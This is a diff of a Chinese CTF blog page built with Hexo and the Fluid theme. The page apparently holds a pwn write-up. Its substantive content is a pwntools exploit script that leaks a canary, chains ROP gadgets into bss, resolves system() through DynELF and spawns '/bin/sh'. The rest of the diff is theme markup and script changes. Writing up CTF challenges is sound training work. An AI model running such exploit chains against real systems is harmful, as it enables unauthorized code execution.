+        <span class="hljs-keyword">else</span>:
             buf += c
             up = c
-    data = buf[:8]
-    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))
-    return data
+    data = buf[:<span class="hljs-number">8</span>]
+    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))
+    <span class="hljs-keyword">return</span> data
 debug()
-payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)
-payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;
+payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)
+payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>
 
-s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)
-payload = p64(canary)*6+p64(bss+0x100-8)
-s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)
+s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)
+payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)
+s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)
 s.recvline()
 
-puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))
+puts = u64(s.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))
 success(hex(puts))
 s.recvline()
 d = DynELF(vuln,elf=elf)
-system = d.lookup(&#39;system&#39;,&#39;libc&#39;)
+system = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)
 success(hex(system))
-payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system)
+payload = p64(pop_rdi)+p64(<span class="hljs-number">0x6010a0</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>*<span class="hljs-number">11</span>)+p64(system)
 s.send(payload)
-s.interactive()
-</code></pre>
+s.interactive()</code></pre></div>
 
+
+            </div>
             <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <a class="hover-with-bg" href="/tags/re">re</a>
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/re/">re</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/IOT/">IOT</a>
+                    
+                  </div>
                 
-                  <a class="hover-with-bg" href="/tags/IOT">IOT</a>
-                
-              </span>
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/08/20/ciscn 2020初赛部分题目/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ciscn 2020初赛部分题目</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/10/MacOS安装IDA插件keypatch/">
+                        <span class="hidden-mobile">MacOS安装IDA插件keypatch</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
             
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
+          </article>
         </div>
       </div>
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<!-- custom -->
-
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
+      </div>
     
   </div>
 </div>
+
+<!-- Custom -->
+
 
     
   </main>
 
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
   
 
@@ -466,92 +536,100 @@ s.interactive()
 </div>
   
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
   
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
-  
-  <br>
 
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
 <!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
-
-
-  
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
 <!-- Plugins -->
 
 
   
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
+    <script  src="/js/lazyload.js" ></script>
   
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
   </script>
 
 
 
-  <script src="/lib/typed/typed.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -571,11 +649,13 @@ s.interactive()
 
 
 
-  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
   <script>
     anchors.options = {
-      placement: "right",
-      visible: "false",
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
       
     };
     var el = "h1,h2,h3,h4,h5,h6".split(",");
@@ -588,25 +668,27 @@ s.interactive()
 
 
 
-  <script src="/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
   <script>
     var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
-      getSearchFile(path);
+      searchFunc(path, 'local-search-input', 'local-search-result');
       this.onclick = null
     }
   </script>
 
 
 
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
   <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
       function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
         $(this).wrap(element);
       }
     );
@@ -616,58 +698,24 @@ s.interactive()
 
 
 
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
 
 
 
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
